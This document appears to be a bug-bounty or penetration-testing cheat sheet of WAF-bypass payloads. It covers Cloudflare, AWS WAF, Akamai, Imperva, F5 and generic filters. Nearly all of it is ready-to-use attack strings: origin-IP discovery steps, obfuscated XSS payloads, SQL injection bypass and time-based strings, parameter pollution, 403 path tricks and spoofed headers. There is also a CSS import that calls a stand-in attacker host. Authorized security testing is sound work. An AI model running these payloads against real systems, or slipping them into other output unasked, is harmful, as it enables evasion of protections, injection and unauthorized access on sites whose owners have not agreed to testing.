# PAYLOADS: WAF Bypass
## Version: 1.0 | Domain: payloads

---

## CLOUDFLARE
```
# Origin discovery (skip CF entirely)
- Search shodan/censys for cert SAN/JARM matching origin
- Look for *.cf-origin.targetdomain.com / mail.tld / dev.tld / staging.tld
- Use OriginIPCheck nuclei templates
- DNSDB historical records before CF was applied

# Bypass at WAF layer
- Newline + comment trick: <svg/onload=alert%0a(1)>
- Use rare HTML5 events: ontoggle, onbeforetoggle, onpointerenter, onpointerover
- Mixed encoding: %u003cscript%u003e
- Double URL: %253Cscript%253E
- Unicode chars: %u02BCscript> (rarely)
- HTTP/2 smuggling on misconfigured edge
- Path normalization: /admin/../admin → /admin (some bypass via /admin/.;/foo)
- Method tampering (POST → PUT → PATCH → DELETE)
- Custom Content-Type: application/json with body that breaks WAF parser

# Body parsing tricks (XSS)
<svg/onload=alert(1)>
<img src=x: onerror=alert(1)>
<iframe src=javascript&#58;alert(1)>
<a href="data:text/html,<script>alert(1)</script>">x</a>
<input/onfocus=alert(1) autofocus>
<details/open/ontoggle=alert(1)>
```

## AWS WAF
```
# alert\u0028 — Unicode bypass (ManagedRuleSet older versions)
<script>alert\u00281)</script>
# Mixed-case
<sCRipT>aLerT(1)</sCRiPT>
# Concat string
<script>al\\u0065rt(1)</script>
# Nested SVG
<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
# Body large enough to evade inspection (default 8KB body limit)
<padding>~~~10KB of A's~~~</padding><script>alert(1)</script>
```

## AKAMAI
```
# AngularJS sandbox-style payloads even though no Angular
<details ontoggle=alert(1) open>
<math><mi xlink:href="data:x,<script>alert(1)</script>">
# Concat in attribute
<input onfocus="alert(1)" autofocus="">
# Throwaway
<input value=&NewLine;<svg/onload=alert(1)>>
```

## IMPERVA / INCAPSULA
```
<style>@import 'http://attacker.tld/x.css';</style>     # CSS-based payload sometimes passes
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

## F5 BIG-IP ASM
```
<details ontoggle=alert(1) open>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
# F5 sometimes blocks "alert(" but not "%61lert("
<script>%61lert(1)</script>
```

## SQLI WAF BYPASS — GENERIC
```
/**/UnIoN/**/SeLeCt
%23%0aselect
+%55nion+%53elect+
1';select%01pg_sleep(5)--
1' OR '1'='1'%00
1';/*!50000select*/ pg_sleep(5)-- -
0e1234'OR'0e1234
```

## PARAM POLLUTION (HPP) FOR WAF SPLIT
```
?id=1&id=' OR '1'='1
?id=1' OR '1'='1&id=2
```

## PATH TRICKS (403 BYPASS)
```
/admin → /admin/
/admin → /admin/.
/admin → /admin//
/admin → /admin/..;/
/admin → /Admin
/admin → /%2e%2eadmin
/admin → /admin?
/admin → /admin#
/admin → /admin..;/
/admin → /admin;.html
/admin → /admin.json
/admin → /admin.css
```

## HEADER TRICKS
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

## REFERENCES
"Bypassing Cloudflare WAF in Bug Bounty Programs.pdf" (uploaded), assetnote bypass blog, PortSwigger Research
